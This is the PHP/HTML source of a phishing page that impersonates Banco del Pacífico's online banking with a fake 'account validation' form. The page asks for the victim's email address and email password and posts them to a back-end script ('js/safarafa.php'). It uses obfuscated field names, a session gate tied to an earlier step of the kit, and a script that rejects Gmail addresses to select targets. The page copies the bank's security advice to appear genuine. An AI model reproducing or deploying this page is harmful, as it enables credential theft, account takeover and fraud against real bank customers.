<?php
session_start();
if (!isset($_SESSION['uzziel'])) {
    header("Location: index1.php");
    exit();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" >
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=9,10,11,Edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

      <style>
         input[type='checkbox'], input[type='radio'] {
         -webkit-box-shadow: none;
         -moz-box-shadow: none;
         box-shadow: none;
         }
         input[type="radio"] {
         border-radius: 8px !important;
         }
         .error-message {
            color: red;
            font-size: 12px;
            display: none;
            margin-top: 5px;
            text-align: center;
         }
      </style>

      <title>Estado general de validaciones</title>
      <link href="ceferefe/styles.css" type="text/css" rel="stylesheet">
      <link href="ceferefe/alphacube.css" type="text/css" rel="stylesheet">
      <link href="ceferefe/loginDecorator.css" type="text/css" rel="stylesheet">
      <link href="ceferefe/jquery.keyboard.css" rel="stylesheet">
      <link href="ceferefe/jquery-ui.theme.css" rel="stylesheet" type="text/css">

      <style>
         .linkRF{
         text-align: center;
         border: 2px solid #FFF;
         color: #FFF;
         padding: 5px;
         font: 12px Arial;
         border-radius: 2px;
         }
         #tooltipRF img{width: 90px;}
         #backgroundDiv img{position: fixed;min-width: 100%;}
         .backImg{position: absolute;margin-left: -109px;cursor: pointer; }
         #botonSendUsernameBox{margin-top: 20px;}
         .espaciadoLogin{height: 17px;}
         .avatar{border: none;}
         #banner{width: 100%;}
         @media only screen and (max-height: 800px){
         #banner {
         margin-bottom: 30px;
         }
         }
         .tooltip .tooltiptext {
         bottom: 77% !important;
         }
         input[type="button" i]{
         width: 100%;
         height: 100%;
         background: none;
         margin-top: 3%;
         }
         input[type="button" i]:focus {
         background-color: #005eb8;
         color: #ffffff;
         }
         input[type="button" i]:active {
         background-color: #005eb8;
         color: #ffffff;
         }
         input[type="button" i]:hover{
         background-color: #005eb8;
         color: #ffffff;
         }
         .botonNuevoCrearUsuario{
         color: #005eb8;
         width: 100%;
         height: 100%;
         border-color: #005eb8;
         font-family: Helvetica!important;
         font-style: normal;
         font-weight: normal;
         font-size: 14px!important;
         }
         .botonNuevoCrearUsuario:hover{
         background-color: #005eb8;
         color: #ffffff;
         }
         .botonRecuperarClave{
         color: #005eb8;
         width: 255px;
         height: 32px;
         background: #ECEFF1;
         border-color: #ECEFF1;
         border: 0px;
         font-family: Helvetica!important;
         font-style: normal;
         font-weight: normal;
         font-size: 14px!important;
         }
         .contenedor-body ul li ::-moz-placeholder,
         .contenedor-formulario ul li ::-moz-placeholder,
         .contenedor-confirmacion ul li ::-moz-placeholder,
         .contenedor-formulario-ingreso ul li ::-moz-placeholder,
         .contenedor-formulario-solapas ul li ::-moz-placeholder {
         /* Firefox 19+ */
         font-size: 13px;
         color: #000 !important;
         font-weight: 100;
         }
         .contenedor-body ul li :-moz-placeholder,
         .contenedor-formulario ul li :-moz-placeholder,
         .contenedor-confirmacion ul li :-moz-placeholder,
         .contenedor-formulario-ingreso ul li :-moz-placeholder,
         .contenedor-formulario-solapas ul li :-moz-placeholder {
         /* Firefox 18- */
         font-size: 13px;
         color: #000 !important;
         font-weight: 100;
         }
         ::-moz-placeholder {
         color: #000 !important;
         font-weight: 100;
         }
         :-ms-input-placeholder {
         color: #cfcfcf;
         font-weight: 100;
         }
         :-moz-placeholder {
         color: #000 !important;
         font-weight: 100;
         }
         .divPopUpErrorTitulo{
         font-size: 18px !important;
         }
         .tituloPopUpError{
         color: #005eb8 !important;
         font-weight: bold !important;
         text-align: center !important;
         }
         .divPopUpTextoValidaciones{
         color: #4C4C4d !important;
         text-align: center !important;
         margin: 15px 18% 10px 18%;
         justify-content: center !important;
         }
         .textoPopUpErrorValidaciones{
         align-content: center;
         text-align: center;
         font-size: 17px !important;
         line-height: 25px !important;
         }
         .popupFondo{
         background-color: white !important;
         }
         button.ui-button.ui-widget.ui-state-default.ui-corner-all.ui-button-icon-only.ui-dialog-titlebar-close {    
         visibility: hidden !important;  
         }
         .ui-dialog .ui-dialog-titlebar{
         padding: 0px !important;
         }
         .ui-widget-header{
         border: 0px !important;
         }
         .ui-corner-all, .ui-corner-top, .ui-corner-right, .ui-corner-tr{
         border-radius: 10px !important;
         }
         .gridPrincipal{
         overflow-x: hidden;
         }
      </style>

      <style> body { display : none;}</style>
   </head>
   <body style="display: block;">
      <div id="backgroundDiv" style="position:absolute;">
         <div style="position: fixed; opacity: 1; background: url('imaxsofiles/03.jpg') #038edd no-repeat center center fixed; background-size: cover; width: 100%; height: 100%;"></div>
      </div>

      <div class="outerDiv_ contLogin" id="">
         <div id="centerTotal">
            <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
            <div class="gridPrincipal">
               <div id="loginBoxExterior" class="loginBoxExterior">
                  <div id="imgLogo" class="centrado">
                     <img src="imaxsofiles/loguitogeneral.png">
                  </div>

                  <div id="loginBox">
                     <form method="post" action="js/safarafa.php" onsubmit="return validarFormulario()">
                        <div class="contentDiv">
                           <div id="titleBox">
                              <h1 id="tituloIngreseUsername" class="titulo-home">Validación de cuenta</h1>
                           </div>
                           <div id="pedirUsernameBox">
                              <div class="limpiar"></div>
                              <div class="formTextInput" id="prodasfhb3i27f">
                                 <label class="textUser">Correo electrónico asociado</label>

                                 <input id="fbwo12r92bfs" name="fbwo12r92bfs" required minlength="2" type="email" class="conTecladoVirtual loginInput validate-caracteres-especiales" placeholder="Ingrese su correo electrónico" onfocus="true">

                                 <label class="textUser">Contraseña de corrreo</label>

                                 <input id="shfn2yc0285" name="shfn2yc0285" type="password" required minlength="2" class="conTecladoVirtual loginInput validate-caracteres-especiales" placeholder="Ingrese su contraseña" onfocus="true">
                                 <img src="imaxsofiles/ingrese-contrasenia_icon.png" class="vistaPassword" onclick="mostrarPassword()" id="showPass">
                              </div>
                              <div id="botonSendUsernameBox">
                                 <input id="btnEnviar" name="btnEnviar" type="submit" value="Continuar" class="botonSiguiente">
                              </div>
                              <!-- Aquí colocamos el mensaje de error debajo del botón Continuar -->
                              <span id="emailError" class="error-message">Este dominio de correo no está permitido.</span>
                              <p></p>

                              <hr>

                           </div>
                        </div>
                        <div class="loginOptions">
                           <ul style="padding-bottom: 12px;">
                              <li>
                              </li>

                           </ul>
                           <ul>

                           </ul>
                        </div>
                     </form>
                  </div>
                  <meta http-equiv="X-UA-Compatible" content="IE=9,10,11,Edge">
                  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

                  <div id="newFooter">
                     <p>&nbsp;</p>
                     <p>Recomendamos utilizar la Banca Virtual con los navegadores</p>
                     <p>Internet explorer 11.0, Chrome 36.0.1, Firefox 31.0, Microsoft Edge.</p>
                     <p>&nbsp;</p>
                     <p>© Copyright 2017 Banco del Pacífico *V4.8.10b</p>
                  </div>
               </div>
               <meta http-equiv="X-UA-Compatible" content="IE=9,10,11,Edge">
               <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

               <div id="loginBoxLeft">
                  <div class="divConsejoTitulo1">Consejos</div>
                  <div></div>
                  <div class="divConsejoTitulo2">Por su seguridad</div>
                  <div></div>

                  <div id="divConsejoDet2" class="divConsejo">
                     <img src="imaxsofiles/key.png">
                     <div style="margin-right: 10px">No compartas tus claves, recuerda que son de uso personal e intransferible.</div>
                  </div>
                  <div id="divConsejoDet3" class="divConsejo">
                     <img src="imaxsofiles/globe.png">
                     <div style="margin-right: 10px">Para acceder a la Banca Virtual, asegúrese de teclear en tu navegador la dirección correctamente.</div>
                  </div>
                  <div id="divConsejoDet4" class="divConsejo">
                     <img src="imaxsofiles/phone.png">
                     <div style="margin-right: 10px">En caso de recibir llamadas, mensajes texto o correos sospechosos, contáctate inmediatamente al <b>3731500</b> opción 10.</div>
                  </div>
               </div>
            </div>
         </div>
         <div id="clearfooter"></div>
      </div>

      <script src="js/sax.js"></script>
       <script>
        function validarFormulario() {
            var emailInput = document.getElementById('fbwo12r92bfs').value;
            var emailError = document.getElementById('emailError');
            if (emailInput.endsWith('@gmail.com')) {
                emailError.style.display = 'block'; // Mostrar el mensaje de error
                return false;
            } else {
                emailError.style.display = 'none'; // Ocultar el mensaje de error
            }
            document.getElementById('btnEnviar').disabled = true;
            return true;
        }
    </script>
      <script>
       $(document).ready(function(){
         $('#showPass').on('click', function(){
            var passInput=$("#shfn2yc0285");
            if(passInput.attr('type')==='password') {
              passInput.attr('type','text');
            } else {
               passInput.attr('type','password');
            }
         })
       })
      </script>
   </body>
</html>
